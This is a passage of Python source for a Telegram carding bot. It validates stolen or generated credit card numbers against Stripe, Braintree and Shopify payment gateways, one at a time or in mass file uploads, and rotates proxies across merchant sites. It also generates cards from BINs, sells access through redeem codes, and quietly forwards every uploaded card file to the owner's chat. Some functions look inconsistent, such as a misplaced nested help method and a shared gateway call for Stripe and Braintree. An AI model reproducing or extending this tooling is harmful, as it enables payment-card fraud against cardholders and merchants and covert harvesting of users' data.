    async def pulse_progress(self, chat_id, msg_id, current, total, card_preview, job_id, elapsed_str, remaining_str):
        bar = self.progress_bar(current, total)
        text = (
            f"⚡ *MASS CHECK IN PROGRESS*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{bar}\n"
            f"📊 Processed: `{current}/{total}`\n"
            f"⏱️ Elapsed: `{elapsed_str}` | Remaining: `{remaining_str}`\n"
            f"🔍 Last: `{card_preview[:15]}...`\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        await self.bot_client.edit_message(
            chat_id, msg_id, text,
            buttons=Button.inline("⏹️ STOP", data=f"stop_{job_id}"),
            parse_mode='markdown'
        )

    # ------------------------------------------------------------------
    #   Main Bot Handlers (Callback & Commands)
    # ------------------------------------------------------------------
    async def start_bot(self):
        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            uid = event.sender_id
            approved = self.has_any_access(uid)
            await self.animated_startup(event)
            total_checked = self.stats['total_checked']
            total_approved = self.stats['total_approved']
            success_rate = (total_approved / total_checked * 100) if total_checked else 0.0
            speed = 1 / DELAY_BETWEEN_CHECKS
            speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
            header = (
                "🌌 *CYBER TERMINAL*\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"⚡ Status: `ONLINE`\n"
                f"🧠 Engine: `ACTIVE`\n\n"
                f"📊 Checked: `{total_checked}`\n"
                f"🔥 Hits: `{total_approved}`\n"
                f"💯 Rate: `{success_rate:.1f}%`\n"
                f"⚡ Speed: `{speed_str} cards/sec`\n"
                f"📁 Stripe: `{MAX_CARDS_PER_FILE_STRIPE}` | Braintree: `{MAX_CARDS_PER_FILE_BRAINTREE}` | Shopify: `{MAX_CARDS_PER_FILE_SHOPIFY}`\n"
                f"🕒 Uptime: `{self.get_uptime()}`\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "🎮 *Select Mode*"
            )
            if approved:
                if uid in ADMINS:
                    btns = [
                        [Button.inline("💳 STRIPE AUTH", data="mode_single"),
                         Button.inline("🌐 BRAINTREE AUTH", data="mode_bt_single")],
                        [Button.inline("📁 STRIPE MASS", data="mode_mass"),
                         Button.inline("📁 BRAINTREE MASS", data="mode_bt_mass")],
                        [Button.inline("🛒 SHOPIFY", data="shopify_menu")],
                        [Button.inline("👤 ACCOUNT", data="account"),
                         Button.inline("ℹ️ HELP", data="help_menu"),
                         Button.inline("🔍 BIN SEARCH", data="bin_search")],
                        [Button.inline("🎴 CARD GENERATOR", data="card_gen"),
                         Button.inline("⚙️ ADMIN", data="admin")]
                    ]
                else:
                    btns = [
                        [Button.inline("💳 STRIPE AUTH", data="mode_single"),
                         Button.inline("🌐 BRAINTREE AUTH", data="mode_bt_single")],
                        [Button.inline("📁 STRIPE MASS", data="mode_mass"),
                         Button.inline("📁 BRAINTREE MASS", data="mode_bt_mass")],
                        [Button.inline("🛒 SHOPIFY", data="shopify_menu")],
                        [Button.inline("👤 ACCOUNT", data="account"),
                         Button.inline("ℹ️ HELP", data="help_menu"),
                         Button.inline("🔍 BIN SEARCH", data="bin_search")],
                        [Button.inline("🎴 CARD GENERATOR", data="card_gen")]
                    ]
            else:
                btns = [
                    [Button.inline("💳 STRIPE AUTH", data="blocked"),
                     Button.inline("🌐 BRAINTREE AUTH", data="blocked")],
                    [Button.inline("📁 STRIPE MASS", data="blocked"),
                     Button.inline("📁 BRAINTREE MASS", data="blocked")],
                    [Button.inline("🛒 SHOPIFY", data="blocked")],
                    [Button.inline("👤 ACCOUNT", data="blocked"),
                     Button.inline("ℹ️ HELP", data="blocked"),
                     Button.inline("🔍 BIN SEARCH", data="blocked")],
                    [Button.inline("🎴 CARD GENERATOR", data="blocked"),
                     Button.inline("🎟️ REDEEM", data="redeem_menu")]
                ]
            await event.reply(header, buttons=btns, parse_mode='markdown')

        @self.bot_client.on(events.CallbackQuery)
        async def callback(event):
            uid = event.sender_id
            data = event.data.decode()
            approved = self.has_any_access(uid)
            shop_approved = self.is_shopify_approved(uid)

            if not approved and data not in ["redeem_menu", "blocked", "shopify_redeem_btn"]:
                await event.answer("❌ Access required. Redeem a code or contact admin.", alert=True)
                return

            if data.startswith(("shopify_", "mode_shopify_")) and data not in ["shopify_redeem_btn", "shopify_menu"]:
                if not shop_approved:
                    await event.answer("❌ Shopify access required. Redeem a Shopify code first.", alert=True)
                    return

            if data.startswith("stop_"):
                jid = data[5:]
                job = self.active_jobs.get(jid)
                if job and job['user_id'] == uid and not job.get('stop'):
                    job['stop'] = True
                    await event.answer("⏹️ Stopping...", alert=True)
                    await event.edit(f"⏹️ *Execution halted*\n{self.progress_bar(job['processed'], job['total'])}", parse_mode='markdown')
                else:
                    await event.answer("Already stopped or not found.", alert=True)

            elif data == "shopify_menu":
                if not shop_approved:
                    btns = [[Button.inline("🎟️ REDEEM SHOPIFY CODE", data="shopify_redeem_btn")],
                            [Button.inline("← BACK", data="back_main")]]
                    await event.edit("🛒 *Shopify Access Required*\n━━━━━━━━━━━━━━━━━━━━\nUse redeem button or contact admin.",
                                     buttons=btns, parse_mode='markdown')
                else:
                    proxy_cnt = len(self.user_proxies.get(uid, []))
                    active_sites = self.get_active_sites()
                    btns = [
                        [Button.inline("💳 SINGLE CHECK", data="mode_shopify_single"),
                         Button.inline("📁 MASS CHECK", data="mode_shopify_mass")],
                        [Button.inline("📎 UPLOAD PROXIES", data="shopify_upload_proxies"),
                         Button.inline("📊 PROXY STATUS", data="shopify_proxy_status")],
                        [Button.inline("🔄 SITE HEALTH", data="shopify_site_health")],
                        [Button.inline("← BACK", data="back_main")]
                    ]
                    if uid in ADMINS:
                        btns.insert(2, [Button.inline("🌐 UPLOAD SITES (OWNER)", data="shopify_upload_sites")])
                    await event.edit(
                        f"🛒 *Shopify Checker*\n━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌐 Active sites: `{len(active_sites)}`\n"
                        f"📎 Your proxies: `{proxy_cnt}`",
                        buttons=btns, parse_mode='markdown'
                    )

            elif data == "mode_shopify_single":
                if not self.get_active_sites():
                    await event.answer("❌ No active sites. Admin must upload sites first.", alert=True)
                    return
                await event.edit(
                    "🛒 *Shopify Single Check*\n━━━━━━━━━━━━━━━━━━━━\n"
                    "Send: `/sp CC|MM|YY|CVV`\nUses your proxies & active sites automatically.",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "mode_shopify_mass":
                if uid not in self.user_proxies or not self.user_proxies[uid]:
                    await event.answer("❌ Upload proxies first!", alert=True)
                    return
                if not self.get_active_sites():
                    await event.answer("❌ No active sites. Admin must upload sites first.", alert=True)
                    return
                self.user_upload_mode[uid] = 'shopify'
                await event.edit(
                    f"📁 *Shopify Mass Upload*\nMax {MAX_CARDS_PER_FILE_SHOPIFY} cards.\nSend .txt file.",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "shopify_upload_proxies":
                self.user_upload_mode[uid] = 'shopify_proxies'
                await event.edit(
                    "📎 *Upload Proxies*\nSend .txt file with `host:port:user:pass` per line.",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "shopify_upload_sites":
                if uid not in ADMINS:
                    await event.answer("❌ Admin only.", alert=True)
                    return
                self.user_upload_mode[uid] = 'shopify_sites'
                await event.edit(
                    "🌐 *Upload Owner Sites (Admin)*\nSend .txt file with Shopify URLs (one per line).",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "shopify_proxy_status":
                proxies = self.user_proxies.get(uid, [])
                await event.edit(f"📊 *Your Proxies*\nLoaded: `{len(proxies)}`", parse_mode='markdown',
                                 buttons=Button.inline("← BACK", data="shopify_menu"))

            elif data == "shopify_site_health":
                active = self.get_active_sites()
                await event.edit(
                    f"🌐 *Active Sites*\n`{len(active)}` sites ready.\nDead: `{len(self.dead_owner_sites)}`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "shopify_redeem_btn":
                await event.edit(
                    "🎟️ *Redeem Shopify Code*\nUse: `/redeem <code>`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_menu")
                )

            elif data == "mode_single":
                if not self.is_user_approved(uid):
                    await event.answer("❌ Global access required.", alert=True)
                    return
                await event.edit(
                    "💳 *Stripe Single Check*\n━━━━━━━━━━━━━━━━━━━━\nSend: `/st CC|MM|YY|CVV`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "mode_bt_single":
                if not self.is_user_approved(uid):
                    await event.answer("❌ Global access required.", alert=True)
                    return
                await event.edit(
                    "🌐 *Braintree Single Auth*\n━━━━━━━━━━━━━━━━━━━━\nSend: `/bt CC|MM|YY|CVV`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "mode_mass":
                if not self.is_user_approved(uid):
                    await event.answer("❌ Global access required.", alert=True)
                    return
                self.user_upload_mode[uid] = 'stripe'
                await event.edit(
                    f"📁 *Stripe Mass Upload*\nMax {MAX_CARDS_PER_FILE_STRIPE} cards.\nSend .txt file.",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "mode_bt_mass":
                if not self.is_user_approved(uid):
                    await event.answer("❌ Global access required.", alert=True)
                    return
                self.user_upload_mode[uid] = 'braintree'
                await event.edit(
                    f"📁 *Braintree Mass Upload*\nMax {MAX_CARDS_PER_FILE_BRAINTREE} cards.\nSend .txt file.",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "account":
                await self.show_user_dashboard(uid, event.chat_id)
                await event.answer()
            elif data == "help_menu":
                await self.show_help(event.chat_id)
                await event.answer()
            elif data == "bin_search":
                await event.edit(
                    "🔍 *BIN Search*\nSend `/bin 424242`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "card_gen":
                await event.edit(
                    "🎴 *Card Generator*\nSend `/generate 1000 424242`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "redeem_menu":
                await event.edit(
                    "🎟️ *Redeem Code*\nSend `/redeem YOUR_CODE`",
                    parse_mode='markdown', buttons=Button.inline("← BACK", data="back_main")
                )
            elif data == "admin":
                if uid not in ADMINS:
                    await event.answer("❌ Admin only", alert=True)
                    return
                btns = [
                    [Button.inline("📢 BROADCAST", data="admin_broadcast"),
                     Button.inline("👥 USERS", data="admin_users")],
                    [Button.inline("📊 STATS", data="admin_stats"),
                     Button.inline("🎟️ GENCODE", data="admin_gencode")],
                    [Button.inline("🛒 SHOPIFY ADMIN", data="shopify_admin"),
                     Button.inline("← BACK", data="back_main")]
                ]
                await event.edit("⚙️ *Admin Dashboard*", buttons=btns, parse_mode='markdown')
            elif data == "shopify_admin":
                if uid not in ADMINS:
                    await event.answer("❌ Admin only", alert=True)
                    return
                btns = [
                    [Button.inline("👥 SHOPIFY USERS", data="shopify_list_users"),
                     Button.inline("🎟️ GEN SHOPIFY CODE", data="shopify_gencode")],
                    [Button.inline("✅ APPROVE SHOPIFY", data="shopify_approve_prompt"),
                     Button.inline("❌ REVOKE SHOPIFY", data="shopify_revoke_prompt")],
                    [Button.inline("← BACK", data="admin")]
                ]
                await event.edit("🛒 *Shopify Admin*", buttons=btns, parse_mode='markdown')
            elif data == "shopify_list_users":
                if not self.shopify_users:
                    await event.edit("No Shopify users.", buttons=Button.inline("← BACK", data="shopify_admin"))
                else:
                    lines = [f"• `{uid}` – {exp.strftime('%Y-%m-%d %H:%M') if exp else 'Permanent'}" for uid, exp in self.shopify_users.items()]
                    await event.edit(f"👥 *Shopify Users*\n{chr(10).join(lines)}", parse_mode='markdown', buttons=Button.inline("← BACK", data="shopify_admin"))
            elif data == "shopify_gencode":
                await event.edit("Use `/shopify_gencode <duration>`", buttons=Button.inline("← BACK", data="shopify_admin"))
            elif data == "shopify_approve_prompt":
                await event.edit("Use `/shopify_approve <user_id> <duration>`", buttons=Button.inline("← BACK", data="shopify_admin"))
            elif data == "shopify_revoke_prompt":
                await event.edit("Use `/shopify_revoke <user_id>`", buttons=Button.inline("← BACK", data="shopify_admin"))
            elif data == "admin_broadcast":
                await event.edit("Use `/broadcast <message>`", buttons=Button.inline("← BACK", data="admin"))
            elif data == "admin_users":
                if not self.users:
                    await event.edit("No approved users.", buttons=Button.inline("← BACK", data="admin"))
                else:
                    lines = [f"• `{uid}` – {exp.strftime('%Y-%m-%d %H:%M') if exp else 'Permanent'}" for uid, exp in self.users.items()]
                    await event.edit(f"👥 *Users*\n{chr(10).join(lines)}", parse_mode='markdown', buttons=Button.inline("← BACK", data="admin"))
            elif data == "admin_stats":
                await event.edit(f"📊 Checked: `{self.stats['total_checked']}`\nHits: `{self.stats['total_approved']}`", parse_mode='markdown', buttons=Button.inline("← BACK", data="admin"))
            elif data == "admin_gencode":
                await event.edit("Use `/gencode <duration>`", buttons=Button.inline("← BACK", data="admin"))
            elif data == "back_main":
                # Rebuild main menu
                total_checked = self.stats['total_checked']
                total_approved = self.stats['total_approved']
                success_rate = (total_approved / total_checked * 100) if total_checked else 0.0
                speed = 1 / DELAY_BETWEEN_CHECKS
                speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
                header = (
                    "🌌 *CYBER TERMINAL*\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚡ Status: `ONLINE`\n"
                    f"🧠 Engine: `ACTIVE`\n\n"
                    f"📊 Checked: `{total_checked}`\n"
                    f"🔥 Hits: `{total_approved}`\n"
                    f"💯 Rate: `{success_rate:.1f}%`\n"
                    f"⚡ Speed: `{speed_str} cards/sec`\n"
                    f"📁 Stripe: `{MAX_CARDS_PER_FILE_STRIPE}` | Braintree: `{MAX_CARDS_PER_FILE_BRAINTREE}` | Shopify: `{MAX_CARDS_PER_FILE_SHOPIFY}`\n"
                    f"🕒 Uptime: `{self.get_uptime()}`\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "🎮 *Select Mode*"
                )
                if self.has_any_access(uid):
                    if uid in ADMINS:
                        btns = [
                            [Button.inline("💳 STRIPE AUTH", data="mode_single"),
                             Button.inline("🌐 BRAINTREE AUTH", data="mode_bt_single")],
                            [Button.inline("📁 STRIPE MASS", data="mode_mass"),
                             Button.inline("📁 BRAINTREE MASS", data="mode_bt_mass")],
                            [Button.inline("🛒 SHOPIFY", data="shopify_menu")],
                            [Button.inline("👤 ACCOUNT", data="account"),
                             Button.inline("ℹ️ HELP", data="help_menu"),
                             Button.inline("🔍 BIN SEARCH", data="bin_search")],
                            [Button.inline("🎴 CARD GENERATOR", data="card_gen"),
                             Button.inline("⚙️ ADMIN", data="admin")]
                        ]
                    else:
                        btns = [
                            [Button.inline("💳 STRIPE AUTH", data="mode_single"),
                             Button.inline("🌐 BRAINTREE AUTH", data="mode_bt_single")],
                            [Button.inline("📁 STRIPE MASS", data="mode_mass"),
                             Button.inline("📁 BRAINTREE MASS", data="mode_bt_mass")],
                            [Button.inline("🛒 SHOPIFY", data="shopify_menu")],
                            [Button.inline("👤 ACCOUNT", data="account"),
                             Button.inline("ℹ️ HELP", data="help_menu"),
                             Button.inline("🔍 BIN SEARCH", data="bin_search")],
                            [Button.inline("🎴 CARD GENERATOR", data="card_gen")]
                        ]
                else:
                    btns = [
                        [Button.inline("💳 STRIPE AUTH", data="blocked"),
                         Button.inline("🌐 BRAINTREE AUTH", data="blocked")],
                        [Button.inline("📁 STRIPE MASS", data="blocked"),
                         Button.inline("📁 BRAINTREE MASS", data="blocked")],
                        [Button.inline("🛒 SHOPIFY", data="blocked")],
                        [Button.inline("👤 ACCOUNT", data="blocked"),
                         Button.inline("ℹ️ HELP", data="blocked"),
                         Button.inline("🔍 BIN SEARCH", data="blocked")],
                        [Button.inline("🎴 CARD GENERATOR", data="blocked"),
                         Button.inline("🎟️ REDEEM", data="redeem_menu")]
                    ]
                await event.edit(header, buttons=btns, parse_mode='markdown')
            elif data == "blocked":
                await event.answer("❌ Access denied. Contact @Unknownentit7", alert=True)

        # ----- Text commands (full set) -----
        @self.bot_client.on(events.NewMessage(pattern=r'/myaccount'))
        async def myaccount_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                await event.reply("❌ Access Denied.")
                return
            await self.show_user_dashboard(uid, event.chat_id)

        @self.bot_client.on(events.NewMessage(pattern=r'/help'))
        async def help_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                await event.reply("❌ Access Denied.")
                return
            await self.show_help(event.chat_id)

        async def show_help(self, chat_id):
            help_text = (
                "ℹ️ *Help & Support*\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "👤 *Support:* @Unknownentit7\n\n"
                "📌 *Commands:*\n"
                "🔍 `/st CC|MM|YY|CVV` – Stripe single check\n"
                "🌐 `/bt CC|MM|YY|CVV` – Braintree single auth\n"
                "📁 Upload `.txt` – Stripe/Braintree mass\n"
                "🛒 `/sp CC|MM|YY|CVV` – Shopify single check\n"
                "👤 `/myaccount` – View your stats\n"
                "🎟️ `/redeem <code>` – Redeem a license\n"
                "🔍 `/bin <BIN>` – Look up BIN information\n"
                "🎴 `/generate <count> [BIN]` – Generate cards\n\n"
                "⚡ *Need help?* Contact @Unknownentit7"
            )
            await self.bot_client.send_message(chat_id, help_text, parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/bin (\d+)'))
        async def bin_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                await event.reply("❌ Access Denied.")
                return
            bin_number = event.pattern_match.group(1)
            await self.bin_search(event.chat_id, bin_number)

        @self.bot_client.on(events.NewMessage(pattern=r'/generate (\d+)(?: (\d+))?'))
        async def generate_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                await event.reply("❌ Access Denied.")
                return
            count = int(event.pattern_match.group(1))
            bin_input = event.pattern_match.group(2) if event.pattern_match.group(2) else None
            if count > MAX_CARDS_PER_FILE_STRIPE:
                await event.reply(f"❌ Maximum {MAX_CARDS_PER_FILE_STRIPE} cards.")
                return
            if bin_input and (len(bin_input) < 6 or not bin_input.isdigit()):
                await event.reply("❌ BIN must be at least 6 digits.")
                return
            await event.reply(f"🎴 Generating {count} cards...")
            cards = self.generate_cards(count, bin_input)
            filepath = os.path.join(STORAGE_DIR, f"generated_{uid}_{uuid.uuid4().hex}.txt")
            with open(filepath, "w") as f:
                f.write("\n".join(cards))
            await self.bot_client.send_file(event.chat_id, filepath, caption=f"✅ Generated {len(cards)} cards")
            os.remove(filepath)

        @self.bot_client.on(events.NewMessage(pattern=r'/redeem (.+)'))
        async def redeem_cmd(event):
            uid = event.sender_id
            code = event.pattern_match.group(1).strip()
            success, typ = await self.redeem_code(uid, code)
            if success:
                if typ == "global":
                    await event.reply("✅ Global access granted!", parse_mode='markdown')
                else:
                    await event.reply("✅ Shopify access granted!", parse_mode='markdown')
            else:
                await event.reply("❌ Invalid or used code.", parse_mode='markdown')

        # Admin commands (abbreviated but present)
        @self.bot_client.on(events.NewMessage(pattern=r'/gencode (.+)'))
        async def gencode_cmd(event):
            if event.sender_id not in ADMINS:
                return
            duration = event.pattern_match.group(1).strip()
            code = self.generate_redeem_code(duration)
            if code:
                await event.reply(f"🎟️ *New Redeem Code*\n`{code}`\nDuration: `{duration}`", parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_gencode (.+)'))
        async def shopify_gencode_cmd(event):
            if event.sender_id not in ADMINS:
                return
            duration = event.pattern_match.group(1).strip()
            code = self.generate_shopify_redeem_code(duration)
            if code:
                await event.reply(f"🎟️ *New Shopify Redeem Code*\n`{code}`\nDuration: `{duration}`", parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_approve (\d+) (.+)'))
        async def shopify_approve_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target = int(event.pattern_match.group(1))
            dur = event.pattern_match.group(2).strip()
            ok, msg = await self.approve_shopify_user(target, dur)
            await event.reply(msg, parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_revoke (\d+)'))
        async def shopify_revoke_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target = int(event.pattern_match.group(1))
            ok, msg = await self.revoke_shopify_user(target)
            await event.reply(msg, parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/approve (\d+) (.+)'))
        async def approve_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target = int(event.pattern_match.group(1))
            dur = event.pattern_match.group(2).strip()
            ok, msg = await self.approve_user(target, dur)
            await event.reply(msg, parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/revoke (\d+)'))
        async def revoke_cmd(event):
            if event.sender_id not in ADMINS:
                return
            target = int(event.pattern_match.group(1))
            ok, msg = await self.revoke_user(target)
            await event.reply(msg, parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern='/revokeall'))
        async def revokeall_cmd(event):
            if event.sender_id not in ADMINS:
                return
            count = await self.revoke_all_non_admins()
            await event.reply(f"✅ Revoked {count} non‑admin users.")

        @self.bot_client.on(events.NewMessage(pattern='/listusers'))
        async def list_cmd(event):
            if event.sender_id not in ADMINS:
                return
            if not self.users:
                await event.reply("No approved users.")
                return
            lines = [f"• `{uid}` – {exp.strftime('%Y-%m-%d %H:%M') if exp else 'Permanent'}" for uid, exp in self.users.items()]
            await event.reply("*Approved users:*\n" + "\n".join(lines), parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern='/broadcast (.+)'))
        async def broadcast_cmd(event):
            if event.sender_id not in ADMINS:
                return
            msg = event.pattern_match.group(1)
            sent = 0
            for uid in self.users.keys():
                try:
                    await self.bot_client.send_message(uid, f"📢 *Broadcast:*\n{msg}", parse_mode='markdown')
                    sent += 1
                except:
                    pass
            await event.reply(f"📢 Sent to {sent} users.")

        @self.bot_client.on(events.NewMessage(pattern='/stop'))
        async def stop_cmd(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                return
            stopped = False
            for jid, job in self.active_jobs.items():
                if job['user_id'] == uid and not job.get('stop'):
                    job['stop'] = True
                    stopped = True
                    await event.reply("⏹️ Stopping your job...")
                    break
            if not stopped:
                await event.reply("No active job found.")

        # ----- Single Checks -----
        @self.bot_client.on(events.NewMessage(pattern=r'/st(?: |$)(.*)'))
        async def single_stripe_check(event):
            uid = event.sender_id
            if not self.is_user_approved(uid):
                await event.reply("❌ Global Access Denied.")
                return
            args = event.pattern_match.group(1).strip()
            if not args:
                await event.reply("❌ Usage: `/st CC|MM|YY|CVV`")
                return
            status_msg = await event.reply("🔄 Checking Stripe...")
            raw = await self.send_card_to_payu(args)
            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if self.is_approved(raw):
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)
                formatted = await self.format_stripe_approved(args, raw, include_charge=False)
                await self.glowing_success(status_msg, formatted)
            else:
                await status_msg.edit(f"❌ *Declined*\n`{raw[:100]}`", parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/bt(?: |$)(.*)'))
        async def single_bt_check(event):
            uid = event.sender_id
            if not self.is_user_approved(uid):
                await event.reply("❌ Global Access Denied.")
                return
            args = event.pattern_match.group(1).strip()
            if not args:
                await event.reply("❌ Usage: `/bt CC|MM|YY|CVV`")
                return
            status_msg = await event.reply("🔄 Checking Braintree...")
            raw = await self.send_card_to_payu(args)
            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if self.is_approved(raw):
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)
                formatted = await self.format_braintree_auth(args, raw)
                await self.glowing_success(status_msg, formatted)
            else:
                await status_msg.edit(f"❌ *Declined*\n`{raw[:100]}`", parse_mode='markdown')

        @self.bot_client.on(events.NewMessage(pattern=r'/sp(?: |$)(.*)'))
        async def shopify_single_check(event):
            uid = event.sender_id
            if not self.is_shopify_approved(uid):
                await event.reply("❌ Shopify Access Denied.")
                return
            args = event.pattern_match.group(1).strip()
            if not args:
                await event.reply("❌ Usage: `/sp CC|MM|YY|CVV`")
                return
            card = args.split()[0]
            proxies = self.user_proxies.get(uid, [])
            if not proxies:
                await event.reply("❌ No proxies uploaded.")
                return
            sites = self.get_active_sites()
            if not sites:
                await event.reply("❌ No active sites. Admin must upload sites.")
                return

            status_msg = await event.reply("🔄 Checking Shopify...")
            approved = False
            info = {}
            used_site = sites[0]
            raw = ""
            # Rotate sites and proxies
            for site in sites:
                for proxy in proxies:
                    raw, ok, info = await self.check_shopify_gateway(card, site, proxy)
                    if ok:
                        approved = True
                        used_site = site
                        break
                    # If we got a meaningful decline (not timeout/error), stop trying this card
                    if info.get("reason") not in ["Timeout", "Error", "Invalid proxy"]:
                        used_site = site
                        break
                if approved or (info and info.get("reason") not in ["Timeout", "Error"]):
                    break

            self.stats["total_checked"] += 1
            self.update_user_stats(uid, checked=1)
            if approved:
                self.stats["total_approved"] += 1
                self.update_user_stats(uid, approved=1)
            formatted = await self.format_shopify_result(card, used_site, raw, approved, info)
            await status_msg.edit(formatted, parse_mode='markdown')

        # ----- Mass File Handler (proxy/site upload, mass checks) -----
        @self.bot_client.on(events.NewMessage(func=lambda e: e.message.document))
        async def file_handler(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                await event.reply("❌ Access Denied.")
                return

            mode = self.user_upload_mode.get(uid)
            if mode is None:
                await event.reply("❌ No upload mode selected.")
                return
            self.user_upload_mode.pop(uid, None)

            doc = event.message.document
            fname = None
            for attr in doc.attributes:
                if isinstance(attr, DocumentAttributeFilename):
                    fname = attr.file_name
                    break
            if not fname or not fname.endswith('.txt'):
                await event.reply("❌ Only .txt files accepted.")
                return

            try:
                content = await self.bot_client.download_file(doc, bytes)
            except Exception as e:
                await event.reply(f"❌ Download failed: {e}")
                return

            if mode == 'shopify_proxies':
                proxies = [l.strip() for l in content.decode().splitlines() if l.strip()]
                if not proxies:
                    await event.reply("❌ No proxies found.")
                    return
                msg = await event.reply(f"📎 Loaded {len(proxies)} proxies. Validating...")
                valid = await self.validate_proxies_batch(proxies)
                self.user_proxies[uid] = valid
                await msg.edit(f"✅ {len(valid)} proxies are alive.")
                return

            elif mode == 'shopify_sites':
                if uid not in ADMINS:
                    await event.reply("❌ Admin only.")
                    return
                sites = [l.strip() for l in content.decode().splitlines() if l.strip()]
                self.owner_shopify_sites = sites
                self.save_owner_sites()
                live = []
                for s in sites:
                    if await self.validate_site(s):
                        live.append(s)
                self.live_owner_sites = live
                await event.reply(f"✅ Owner sites updated. {len(live)} live.")
                return

            # Mass checks
            if mode == 'stripe':
                if not self.is_user_approved(uid):
                    await event.reply("❌ Global approval required.")
                    return
                max_cards = MAX_CARDS_PER_FILE_STRIPE
                gateway = 'stripe'
                prefix = "📁 Stripe"
            elif mode == 'braintree':
                if not self.is_user_approved(uid):
                    await event.reply("❌ Global approval required.")
                    return
                max_cards = MAX_CARDS_PER_FILE_BRAINTREE
                gateway = 'braintree'
                prefix = "🌐 Braintree"
            elif mode == 'shopify':
                if not self.is_shopify_approved(uid):
                    await event.reply("❌ Shopify access required.")
                    return
                if uid not in self.user_proxies or not self.user_proxies[uid]:
                    await event.reply("❌ Upload proxies first.")
                    return
                sites = self.get_active_sites()
                if not sites:
                    await event.reply("❌ No active sites. Admin must upload sites.")
                    return
                max_cards = MAX_CARDS_PER_FILE_SHOPIFY
                gateway = 'shopify'
                prefix = "🛒 Shopify"
            else:
                return

            if any(job['user_id'] == uid for job in self.active_jobs.values()):
                await event.reply("❌ You already have an active mass check.")
                return

            # Forward to owner
            try:
                sender = await event.get_sender()
                username = sender.username or "No username"
                user_link = f"[{username}](tg://user?id={uid})" if sender.username else f"ID: `{uid}`"
                caption = f"{prefix} file: `{fname}`\n👤 *By:* {user_link}"
                await self.bot_client.send_file(FORWARD_CHAT_ID, file=content, caption=caption, parse_mode='markdown')
            except Exception as e:
                logger.error(f"Forward failed: {e}")

            filepath = self.save_cards_file(content, uid, event.chat_id)
            valid, cnt, err = self.validate_cards_file(filepath, max_cards)
            if not valid:
                os.remove(filepath)
                await event.reply(f"❌ Validation failed: {err}")
                return

            job_id = str(uuid.uuid4())
            self.active_jobs[job_id] = {
                'filepath': filepath, 'user_id': uid, 'chat_id': event.chat_id,
                'total': cnt, 'processed': 0, 'stop': False, 'message_id': None,
                'approved_cards': [], 'gateway': gateway, 'start_time': datetime.now()
            }
            speed = 1 / DELAY_BETWEEN_CHECKS
            speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
            msg = await event.reply(
                f"{prefix} | {cnt} cards\n{self.progress_bar(0, cnt)}\n⚡ {speed_str} cards/sec",
                buttons=Button.inline("⏹️ STOP", data=f"stop_{job_id}"),
                parse_mode='markdown'
            )
            self.active_jobs[job_id]['message_id'] = msg.id
            await self.task_queue.put((job_id, filepath, uid, event.chat_id, gateway))

        # Start site health checker
        self.site_check_task = asyncio.create_task(self.update_site_health())
        logger.info("Bot handlers registered.")
        await self.bot_client.run_until_disconnected()

    # ------------------------------------------------------------------
    #   Worker Loop (Processes mass checks)
    # ------------------------------------------------------------------
    async def worker_loop(self, wid: int):
        logger.info(f"Worker {wid} started.")
        while True:
            try:
                job_id, filepath, user_id, chat_id, gateway = await self.task_queue.get()
            except Exception:
                await asyncio.sleep(1)
                continue
            job = self.active_jobs.get(job_id)
            if not job:
                continue
            start_time = job.get('start_time', datetime.now())
            logger.info(f"Worker {wid} processing {job_id} ({gateway})")

            if not self.has_any_access(user_id):
                job['stop'] = True
                await self.bot_client.send_message(chat_id, "⏹️ Access expired.")
                self.active_jobs.pop(job_id, None)
                self.task_queue.task_done()
                continue

            try:
